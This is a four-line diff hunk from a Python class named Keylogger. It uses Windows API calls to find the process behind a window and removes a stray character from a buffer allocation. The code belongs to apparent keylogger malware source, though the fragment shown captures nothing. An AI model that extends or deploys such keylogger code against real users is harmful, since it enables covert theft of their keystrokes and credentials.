@@ -55,4 +55,4 @@ class Keylogger:
         windll.user32.GetWindowThreadProcessId(hwnd, byref(pid))
         process_id = f"{pid.value}"
 
-        executable = create_string_buffer(512) é
+        executable = create_string_buffer(512)
